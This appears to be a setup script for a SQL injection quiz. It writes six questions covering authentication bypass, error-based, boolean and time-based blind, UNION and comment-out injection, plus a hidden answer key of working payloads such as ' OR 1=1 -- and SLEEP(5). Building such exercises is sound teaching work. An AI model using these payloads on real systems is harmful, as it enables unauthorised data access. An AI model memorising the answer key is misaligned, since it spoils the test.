#!/usr/bin/env bash
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
[ -f "$HERE/questions.txt" ] && exit 0

cat > "$HERE/questions.txt" <<'EOF'
1. Authentication bypass on:  SELECT * FROM users WHERE username='<HERE>' AND password='<x>'
   (Complete the username field so the query returns the first row regardless of password.)

2. Error-based detection on a numeric id parameter:  ?id=<HERE>
   (A single payload that should cause a SQL syntax error on a vulnerable backend.)

3. Boolean-based blind detection (TRUE side) on:  ?id=1<HERE>
   (Payload that keeps id=1 but appends an always-true boolean comparison.)

4. Time-based blind detection on MySQL:  ?id=1<HERE>
   (Payload that delays response by 5 seconds using MySQL's SLEEP.)

5. UNION-based dump on a 3-column query:  ?id=-1<HERE>
   (Payload that produces a UNION SELECT returning 3 null/sentinel values.)

6. Comment-out trailing SQL on MS SQL Server:  ' OR 1=1<HERE>
   (The SQL Server-style line comment that ends the query early.)
EOF

cat > "$HERE/.answers" <<'EOF'
' OR 1=1 --||' OR '1'='1' --||' OR 1=1#||' OR '1'='1'#
'||"||\
1 AND 1=1||AND 1=1||1 AND 1=1 --
1 AND SLEEP(5)||AND SLEEP(5)||1 AND SLEEP(5) --
1 UNION SELECT NULL,NULL,NULL||-1 UNION SELECT NULL,NULL,NULL||UNION SELECT NULL,NULL,NULL
--||-- -
EOF
chmod 600 "$HERE/.answers"

cat > "$HERE/answers.txt" <<'EOF'
# One payload per line, in question order.
# Whitespace is normalized; comment-marker style matters.
EOF
